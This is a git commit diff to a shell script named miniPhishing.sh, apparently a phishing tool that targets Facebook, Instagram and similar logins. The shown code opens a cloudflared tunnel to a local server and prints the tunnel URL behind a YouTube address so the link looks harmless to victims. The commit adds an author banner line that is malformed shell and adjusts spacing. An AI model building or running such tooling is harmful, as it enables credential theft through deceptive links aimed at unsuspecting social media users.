5333f5be4a37a2d5222c32adfd8b773208fd1c3e
ikka <152771577+call-me-ikka@users.noreply.github.com>
2026-01-02 23:34:55 -0500

    Update miniPhishing.sh

--- miniPhishing.sh
+++ miniPhishing.sh
@@ -2,6 +2,7 @@
 clear
 echo "============================"
 echo "    MINI PHISHING TOOL      "
+     "                by ikka     "
 echo "============================"
 echo "[1] Facebook"
 echo "[2] Instagram"
@@ -20,7 +21,7 @@ elif [ $opt -eq 2 ]; then
     ./../../cloudflared tunnel --url http://127.0.0.1:8080 > link.log 2>&1 &
     sleep 8
     link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' link.log)
-    echo -e "\n\e[32m[+] Link: \e[34m https://youtube.com/shorts/cYEbfTkzpTA?si=DcIY1oiU_4xfGQ8a ${link#https://}\e[0m\n"
+    echo -e "\n\e[32m[+] Link: \e[34mhttps://youtube.com/shorts/cYEbfTkzpTA?si=DcIY1oiU_4xfGQ8a ${link#https://}\e[0m\n"
     echo "Press Ctrl+C to stop the server."
     wait
 elif [ $opt -eq 3 ]; then
